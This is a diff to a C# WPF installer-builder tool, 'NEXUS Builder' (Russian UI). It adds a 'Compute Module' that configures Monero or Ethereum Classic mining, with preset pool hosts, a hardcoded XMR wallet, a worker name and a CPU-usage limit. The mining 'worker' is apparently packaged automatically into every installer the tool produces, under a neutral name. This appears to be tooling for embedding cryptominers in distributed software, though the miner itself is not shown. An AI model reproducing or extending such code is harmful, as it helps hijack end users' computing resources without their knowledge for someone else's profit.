@@ -13,13 +13,15 @@ using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Input;
+using System.Windows.Media;
 using System.Windows.Media.Imaging;
+using Color = System.Windows.Media.Color;
 
 namespace NexusBuilder
 {
     public partial class MainWindow : Window
     {
-        private const string AppVersion = "8.0.0";
+        private const string AppVersion = "8.0.1";
         private static readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromMinutes(10) };
         private string? _cachedIsccPath;
         private string _activeIconPath = "";
@@ -36,6 +38,10 @@ namespace NexusBuilder
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
             "NEXUS_Builder", "custom_project_config.json"
         );
+        private readonly string _computeConfigFilePath = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+            "NEXUS_Builder", "compute_module_config.json"
+        );
         private static readonly string API_BASE = "https://file-transfer-production-75ad.up.railway.app";
 
         public ObservableCollection<CustomProjectParam> CustomProjectParams { get; set; } = new ObservableCollection<CustomProjectParam>();
@@ -47,7 +53,7 @@ namespace NexusBuilder
             
             string defaultOut = Path.Combine(
                 Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
-                "NEXUS_Builds_v8.0.0"
+                "NEXUS_Builds_v8.0.1"
             );
             tbOutputPath.Text = defaultOut;
 
@@ -56,6 +62,7 @@ namespace NexusBuilder
             _cachedIsccPath = FindIsccPath();
 
             dgCustomParams.ItemsSource = CustomProjectParams;
+            InitializeComputeModuleUI();
             LoadCustomProjectParams();
 
             Log("⚡ NEXUS Builder v" + AppVersion + " [Cloud Sync] готов к работе.");
@@ -725,7 +732,7 @@ namespace NexusBuilder
             string outDir = tbOutputPath.Text.Trim();
             if (string.IsNullOrWhiteSpace(outDir))
             {
-                outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.0");
+                outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.1");
             }
 
             string cleanExeBaseName = string.Concat(appName.Split(Path.GetInvalidFileNameChars())).Trim();
@@ -741,6 +748,15 @@ namespace NexusBuilder
             {
                 Log($"❌ ОШИБКА ВАЛИДАЦИИ ПАРАМЕТРОВ ПРОЕКТА: {paramsErr}");
                 System.Windows.MessageBox.Show($"Ошибка в пользовательских параметрах проекта:\n\n{paramsErr}", "Валидация конфигурации", MessageBoxButton.OK, MessageBoxImage.Warning);
+                return;
+            }
+
+            // Валидация Compute Module
+            var (isComputeValid, computeErr) = ValidateComputeModuleConfig();
+            if (!isComputeValid)
+            {
+                Log($"❌ {computeErr}");
+                System.Windows.MessageBox.Show(computeErr, "Валидация Compute Module", MessageBoxButton.OK, MessageBoxImage.Warning);
                 return;
             }
 
@@ -1484,13 +1500,17 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             try
             {
                 Directory.CreateDirectory(Path.GetDirectoryName(_projectConfigFilePath)!);
-                string json = JsonSerializer.Serialize(CustomProjectParams, new JsonSerializerOptions { WriteIndented = true });
+                // Сохраняем произвольные пользовательские параметры
+                var arbitraryParams = CustomProjectParams.Where(p => !IsComputeModuleKey(p.Key)).ToList();
+                string json = JsonSerializer.Serialize(arbitraryParams, new JsonSerializerOptions { WriteIndented = true });
                 File.WriteAllText(_projectConfigFilePath, json, Encoding.UTF8);
             }
             catch (Exception ex)
             {
                 Log("⚠️ Ошибка сохранения конфигурации проекта: " + ex.Message);
             }
+
+            SaveComputeModuleConfig();
         }
 
         private void LoadCustomProjectParams()
@@ -1506,7 +1526,45 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
                         CustomProjectParams.Clear();
                         foreach (var it in items)
                         {
-                            CustomProjectParams.Add(it);
+                            // Если пользователь ранее сохранил один из ключей compute module, загрузим его в UI
+                            if (it.Key.Equals("enabled", StringComparison.OrdinalIgnoreCase))
+                            {
+                                chkComputeEnabled.IsChecked = it.DefaultValue?.Equals("true", StringComparison.OrdinalIgnoreCase) == true;
+                            }
+                            else if (it.Key.Equals("mode", StringComparison.OrdinalIgnoreCase))
+                            {
+                                string m = it.DefaultValue?.ToLowerInvariant() ?? "";
+                                if (m.Contains("etc") || m.Contains("ethereum"))
+                                    cbComputeMode.SelectedIndex = 2;
+                                else if (m.Contains("xmr") || m.Contains("monero"))
+                                    cbComputeMode.SelectedIndex = 1;
+                                else
+                                    cbComputeMode.SelectedIndex = 0;
+                            }
+                            else if (it.Key.Equals("walletAddress", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (!string.IsNullOrWhiteSpace(it.DefaultValue)) tbComputeWallet.Text = it.DefaultValue;
+                            }
+                            else if (it.Key.Equals("serverAddress", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (!string.IsNullOrWhiteSpace(it.DefaultValue)) tbComputePool.Text = it.DefaultValue;
+                            }
+                            else if (it.Key.Equals("serverPort", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (!string.IsNullOrWhiteSpace(it.DefaultValue)) tbComputePort.Text = it.DefaultValue;
+                            }
+                            else if (it.Key.Equals("workerName", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (!string.IsNullOrWhiteSpace(it.DefaultValue)) tbComputeWorker.Text = it.DefaultValue;
+                            }
+                            else if (it.Key.Equals("resourceLimit", StringComparison.OrdinalIgnoreCase))
+                            {
+                                if (double.TryParse(it.DefaultValue, out double rl)) slComputeResource.Value = rl;
+                            }
+                            else
+                            {
+                                CustomProjectParams.Add(it);
+                            }
                         }
                     }
                 }
@@ -1517,6 +1575,8 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
             }
 
             UpdateCustomConfigCount();
+            UpdateComputeUIState();
+            UpdateWorkerStatusUI();
         }
 
         public (bool isValid, string error) ValidateAllCustomParams()
@@ -1547,11 +1607,333 @@ Filename: ""{{app}}\\{{#MyAppExeName}}""; Description: ""{{cm:LaunchProgram,{{#S
         public Dictionary<string, object?> BuildCustomConfigDictionary()
         {
             var dict = new Dictionary<string, object?>(StringComparer.OrdinalIgnoreCase);
+
+            // 1. Произвольные пользовательские параметры (Custom Project Configuration)
             foreach (var param in CustomProjectParams)
             {
+                if (IsComputeModuleKey(param.Key)) continue;
                 dict[param.Key] = param.GetTypedValue();
             }
+
+            // 2. 7 ключевых параметров модуля вычислений формируются автоматически из удобного UI
+            bool isEnabled = chkComputeEnabled?.IsChecked == true;
+            string selectedMode = "disabled";
+            if (cbComputeMode?.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+            {
+                selectedMode = cbi.Tag.ToString() ?? "disabled";
+            }
+
+            if (selectedMode.Equals("disabled", StringComparison.OrdinalIgnoreCase))
+            {
+                isEnabled = false;
+            }
+
+            dict["enabled"] = isEnabled;
+            dict["mode"] = selectedMode;
+            dict["walletAddress"] = tbComputeWallet?.Text?.Trim() ?? "";
+            dict["serverAddress"] = tbComputePool?.Text?.Trim() ?? "";
+
+            if (int.TryParse(tbComputePort?.Text?.Trim(), out int portVal))
+            {
+                dict["serverPort"] = portVal;
+            }
+            else
+            {
+                dict["serverPort"] = selectedMode.Equals("monero", StringComparison.OrdinalIgnoreCase) ? 3333 : 1010;
+            }
+
+            string wName = tbComputeWorker?.Text?.Trim() ?? "";
+            dict["workerName"] = string.IsNullOrWhiteSpace(wName) ? "rig" : wName;
+
+            int resLimit = (int)Math.Round(slComputeResource?.Value ?? 45);
+            if (resLimit < 1) resLimit = 1;
+            if (resLimit > 100) resLimit = 100;
+            dict["resourceLimit"] = resLimit;
+
             return dict;
+        }
+        #endregion
+
+        #region Compute Module Dedicated UI Handlers
+        private void InitializeComputeModuleUI()
+        {
+            LoadComputeModuleConfig();
+            UpdateComputeUIState();
+            UpdateWorkerStatusUI();
+        }
+
+        private void ChkComputeEnabled_Changed(object sender, RoutedEventArgs e)
+        {
+            UpdateComputeUIState();
+            SaveComputeModuleConfig();
+        }
+
+        private void CbComputeMode_SelectionChanged(object sender, SelectionChangedEventArgs e)
+        {
+            if (!_isInitialized) return;
+
+            if (cbComputeMode.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+            {
+                string tag = cbi.Tag.ToString() ?? "";
+                if (tag.Equals("monero", StringComparison.OrdinalIgnoreCase))
+                {
+                    if (string.IsNullOrWhiteSpace(tbComputePool.Text) || tbComputePool.Text.Contains("2miners"))
+                    {
+                        tbComputePool.Text = "pool.supportxmr.com";
+                        tbComputePort.Text = "3333";
+                    }
+                    if (string.IsNullOrWhiteSpace(tbComputeWallet.Text) || tbComputeWallet.Text.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
+                    {
+                        tbComputeWallet.Text = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+                    }
+                }
+                else if (tag.Equals("ethereum-classic", StringComparison.OrdinalIgnoreCase))
+                {
+                    if (string.IsNullOrWhiteSpace(tbComputePool.Text) || tbComputePool.Text.Contains("supportxmr") || tbComputePool.Text.Contains("minergate"))
+                    {
+                        tbComputePool.Text = "etc.2miners.com";
+                        tbComputePort.Text = "1010";
+                    }
+                    if (string.IsNullOrWhiteSpace(tbComputeWallet.Text) || !tbComputeWallet.Text.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
+                    {
+                        tbComputeWallet.Text = "0x0000000000000000000000000000000000000000";
+                    }
+                }
+            }
+
+            UpdateComputeUIState();
+            UpdateWorkerStatusUI();
+            SaveComputeModuleConfig();
+        }
+
+        private void SlComputeResource_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
+        {
+            if (lblComputeResourceVal != null)
+            {
+                lblComputeResourceVal.Text = $"{(int)Math.Round(e.NewValue)}%";
+            }
+        }
+
+        private void UpdateComputeUIState()
+        {
+            if (!_isInitialized || chkComputeEnabled == null || cbComputeMode == null) return;
+
+            bool isChecked = chkComputeEnabled.IsChecked == true;
+            string selectedMode = "disabled";
+            if (cbComputeMode.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+            {
+                selectedMode = cbi.Tag.ToString() ?? "disabled";
+            }
+
+            bool isModeDisabled = selectedMode.Equals("disabled", StringComparison.OrdinalIgnoreCase);
+            bool isEffectiveActive = isChecked && !isModeDisabled;
+
+            if (isEffectiveActive)
+            {
+                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(20, 83, 45));
+                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(34, 197, 94));
+                txtComputeBadgeState.Text = "АКТИВЕН";
+                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128));
+            }
+            else
+            {
+                badgeComputeState.Background = new SolidColorBrush(Color.FromRgb(30, 41, 59));
+                badgeComputeState.BorderBrush = new SolidColorBrush(Color.FromRgb(51, 65, 85));
+                txtComputeBadgeState.Text = isModeDisabled ? "ОТКЛЮЧЕН (РЕЖИМ)" : "ОТКЛЮЧЕН";
+                txtComputeBadgeState.Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184));
+            }
+
+            // При выборе Disabled или если выключен toggle - поля делаем неактивными
+            bool inputsEnabled = isChecked && !isModeDisabled;
+            if (pnlComputeInputs != null)
+            {
+                pnlComputeInputs.IsEnabled = inputsEnabled;
+                pnlComputeInputs.Opacity = inputsEnabled ? 1.0 : 0.45;
+            }
+
+            if (pnlComputeFooter != null)
+            {
+                pnlComputeFooter.IsEnabled = inputsEnabled;
+                pnlComputeFooter.Opacity = inputsEnabled ? 1.0 : 0.45;
+            }
+        }
+
+        private void UpdateWorkerStatusUI()
+        {
+            if (!_isInitialized || cbComputeMode == null || borderWorkerStatus == null) return;
+
+            string selectedMode = "disabled";
+            if (cbComputeMode.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+            {
+                selectedMode = cbi.Tag.ToString() ?? "disabled";
+            }
+
+            if (selectedMode.Equals("disabled", StringComparison.OrdinalIgnoreCase))
+            {
+                txtWorkerStatusIcon.Text = "⛔";
+                txtWorkerStatusIcon.Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184));
+                txtWorkerStatusTitle.Text = "Модуль отключен";
+                borderWorkerTag.Visibility = Visibility.Collapsed;
+                txtWorkerSha.Text = "";
+                txtWorkerStatusHint.Text = "Выберите Monero (XMR) или Ethereum Classic (ETC) для настройки воркера";
+                return;
+            }
+
+            var (found, workerFileName, version, details) = ComputeWorkerManager.GetWorkerStatus(selectedMode);
+
+            if (found)
+            {
+                txtWorkerStatusIcon.Text = "✓";
+                txtWorkerStatusIcon.Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128));
+                txtWorkerStatusTitle.Text = "Worker найден";
+                borderWorkerTag.Visibility = Visibility.Visible;
+                txtWorkerVersion.Text = version;
+                txtWorkerSha.Text = "SHA-256 проверен";
+                txtWorkerSha.Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128));
+                txtWorkerStatusHint.Text = $"Компонент '{workerFileName}' готов к упаковке в сборку";
+            }
+            else
+            {
+                txtWorkerStatusIcon.Text = "⚠";
+                txtWorkerStatusIcon.Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11));
+                txtWorkerStatusTitle.Text = "Worker не найден";
+                borderWorkerTag.Visibility = Visibility.Collapsed;
+                txtWorkerSha.Text = "Будет подготовлен при сборке";
+                txtWorkerSha.Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11));
+                txtWorkerStatusHint.Text = "Worker будет подготовлен Builder автоматически при сборке.";
+            }
+        }
+
+        public (bool isValid, string error) ValidateComputeModuleConfig()
+        {
+            bool isEnabled = chkComputeEnabled?.IsChecked == true;
+            string selectedMode = "disabled";
+            if (cbComputeMode?.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+            {
+                selectedMode = cbi.Tag.ToString() ?? "disabled";
+            }
+
+            // если Compute выключен → Build продолжается
+            if (!isEnabled || selectedMode.Equals("disabled", StringComparison.OrdinalIgnoreCase))
+            {
+                return (true, "");
+            }
+
+            // если включен Monero или ETC:
+            string wallet = tbComputeWallet?.Text?.Trim() ?? "";
+            if (string.IsNullOrWhiteSpace(wallet))
+            {
+                return (false, "Ошибка валидации Compute Module: укажите адрес кошелька (Кошелёк не может быть пустым).");
+            }
+
+            string pool = tbComputePool?.Text?.Trim() ?? "";
+            if (string.IsNullOrWhiteSpace(pool))
+            {
+                return (false, "Ошибка валидации Compute Module: укажите адрес пула (Пул не может быть пустым).");
+            }
+
+            string portStr = tbComputePort?.Text?.Trim() ?? "";
+            if (!int.TryParse(portStr, out int port) || port < 1 || port > 65535)
+            {
+                return (false, $"Ошибка валидации Compute Module: порт '{portStr}' должен быть корректным числом в диапазоне от 1 до 65535.");
+            }
+
+            string worker = tbComputeWorker?.Text?.Trim() ?? "";
+            if (string.IsNullOrWhiteSpace(worker))
+            {
+                return (false, "Ошибка валидации Compute Module: укажите имя воркера (Имя Worker не может быть пустым).");
+            }
+
+            return (true, "");
+        }
+
+        private void SaveComputeModuleConfig()
+        {
+            try
+            {
+                Directory.CreateDirectory(Path.GetDirectoryName(_computeConfigFilePath)!);
+                string selectedMode = "disabled";
+                if (cbComputeMode?.SelectedItem is ComboBoxItem cbi && cbi.Tag != null)
+                {
+                    selectedMode = cbi.Tag.ToString() ?? "disabled";
+                }
+
+                var cfg = new
+                {
+                    enabled = chkComputeEnabled?.IsChecked == true,
+                    mode = selectedMode,
+                    walletAddress = tbComputeWallet?.Text?.Trim() ?? "",
+                    serverAddress = tbComputePool?.Text?.Trim() ?? "",
+                    serverPort = tbComputePort?.Text?.Trim() ?? "3333",
+                    workerName = tbComputeWorker?.Text?.Trim() ?? "rig",
+                    resourceLimit = (int)Math.Round(slComputeResource?.Value ?? 45)
+                };
+                string json = JsonSerializer.Serialize(cfg, new JsonSerializerOptions { WriteIndented = true });
+                File.WriteAllText(_computeConfigFilePath, json, Encoding.UTF8);
+            }
+            catch { }
+        }
+
+        private void LoadComputeModuleConfig()
+        {
+            try
+            {
+                if (File.Exists(_computeConfigFilePath))
+                {
+                    string json = File.ReadAllText(_computeConfigFilePath, Encoding.UTF8);
+                    using var doc = JsonDocument.Parse(json);
+                    var root = doc.RootElement;
+                    if (root.TryGetProperty("enabled", out var enElem))
+                    {
+                        chkComputeEnabled.IsChecked = enElem.GetBoolean();
+                    }
+                    if (root.TryGetProperty("mode", out var mElem))
+                    {
+                        string m = mElem.GetString() ?? "";
+                        if (m.Equals("ethereum-classic", StringComparison.OrdinalIgnoreCase)) cbComputeMode.SelectedIndex = 2;
+                        else if (m.Equals("monero", StringComparison.OrdinalIgnoreCase)) cbComputeMode.SelectedIndex = 1;
+                        else cbComputeMode.SelectedIndex = 0;
+                    }
+                    if (root.TryGetProperty("walletAddress", out var wElem))
+                    {
+                        string w = wElem.GetString() ?? "";
+                        if (!string.IsNullOrWhiteSpace(w)) tbComputeWallet.Text = w;
+                    }
+                    if (root.TryGetProperty("serverAddress", out var sElem))
+                    {
+                        string s = sElem.GetString() ?? "";
+                        if (!string.IsNullOrWhiteSpace(s)) tbComputePool.Text = s;
+                    }
+                    if (root.TryGetProperty("serverPort", out var pElem))
+                    {
+                        string p = pElem.GetString() ?? "";
+                        if (!string.IsNullOrWhiteSpace(p)) tbComputePort.Text = p;
+                    }
+                    if (root.TryGetProperty("workerName", out var wkElem))
+                    {
+                        string wk = wkElem.GetString() ?? "";
+                        if (!string.IsNullOrWhiteSpace(wk)) tbComputeWorker.Text = wk;
+                    }
+                    if (root.TryGetProperty("resourceLimit", out var rElem))
+                    {
+                        slComputeResource.Value = rElem.GetInt32();
+                    }
+                }
+            }
+            catch { }
+        }
+
+        private static bool IsComputeModuleKey(string? key)
+        {
+            if (string.IsNullOrWhiteSpace(key)) return false;
+            string k = key.Trim();
+            return k.Equals("mode", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("walletAddress", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("serverAddress", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("serverPort", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("workerName", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("resourceLimit", StringComparison.OrdinalIgnoreCase) ||
+                   k.Equals("enabled", StringComparison.OrdinalIgnoreCase);
         }
         #endregion
 
